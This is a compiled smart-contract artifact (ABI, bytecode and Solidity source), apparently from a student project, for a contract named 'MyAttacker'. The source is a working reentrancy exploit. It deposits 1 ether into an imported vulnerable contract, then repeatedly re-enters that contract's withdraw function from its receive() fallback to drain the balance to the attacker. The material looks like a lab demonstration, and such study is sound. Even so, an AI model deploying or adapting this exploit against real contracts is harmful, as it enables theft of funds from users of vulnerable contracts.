{
  "contractName": "MyAttacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_victim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "myVictim",
      "outputs": [
        {
          "internalType": "contract MyContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610696380380610696833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61057f806101176000396000f3fe6080604052600436106100385760003560e01c80633ccfd60b1461010c578063681332fc146101235780639e5faafc1461014e57610107565b3661010757670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156101055760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100ec57600080fd5b505af1158015610100573d6000803e3d6000fd5b505050505b005b600080fd5b34801561011857600080fd5b50610121610158565b005b34801561012f57600080fd5b50610138610207565b60405161014591906103ff565b60405180910390f35b61015661022b565b005b60003373ffffffffffffffffffffffffffffffffffffffff164760405161017e9061044b565b60006040518083038185875af1925050503d80600081146101bb576040519150601f19603f3d011682016040523d82523d6000602084013e6101c0565b606091505b5050905080610204576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fb906104bd565b60405180910390fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003414610275576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161026c90610529565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102e557600080fd5b505af11580156102f9573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561036657600080fd5b505af115801561037a573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103c56103c06103bb84610380565b6103a0565b610380565b9050919050565b60006103d7826103aa565b9050919050565b60006103e9826103cc565b9050919050565b6103f9816103de565b82525050565b600060208201905061041460008301846103f0565b92915050565b600081905092915050565b50565b600061043560008361041a565b915061044082610425565b600082019050919050565b600061045682610428565b9150819050919050565b600082825260208201905092915050565b7f5769746864726177616c204661696c7572650000000000000000000000000000600082015250565b60006104a7601283610460565b91506104b282610471565b602082019050919050565b600060208201905081810360008301526104d68161049a565b9050919050565b7f53656e642041747461636b2045544853554d0000000000000000000000000000600082015250565b6000610513601283610460565b915061051e826104dd565b602082019050919050565b6000602082019050818103600083015261054281610506565b905091905056fea264697066735822122011cecd4b84ae03a9dfc8e8d88d6f7710c472d3ea03dea6885a1080bd0ee5775464736f6c63430008130033",
  "immutableReferences": {},
  "source": "//SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity 0.8.19;\r\n\r\nimport \"./REENTVictim.sol\";\r\n\r\ncontract MyAttacker {\r\n\r\n    MyContract public myVictim; //public variable for MyContract vulnerable smart contract\r\n    constructor(address _victim) { //takes vulnerable contract\r\n        myVictim = MyContract(_victim); //initialise variable with address\r\n    }\r\n\r\n    receive() external payable {\r\n        if (address(myVictim).balance > 1 ether) { //balance check (above 1 Ether)\r\n            myVictim.withdraw(); //withdraw function being called from other contract\r\n        }\r\n    }\r\n\r\n    function attack() external payable {\r\n        require(msg.value == 1 ether, \"Send Attack ETHSUM\"); //1 Eth for attack\r\n        myVictim.deposit{value: 1 ether}(); //calling deposit\r\n        myVictim.withdraw();\r\n    }\r\n\r\n    function withdraw() public {\r\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\"); //sends balance to user calling function\r\n        require(success, \"Withdrawal Failure\");\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Individual Project\\Smart Contracts\\contracts\\REENTAttacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-22T17:37:36.535Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}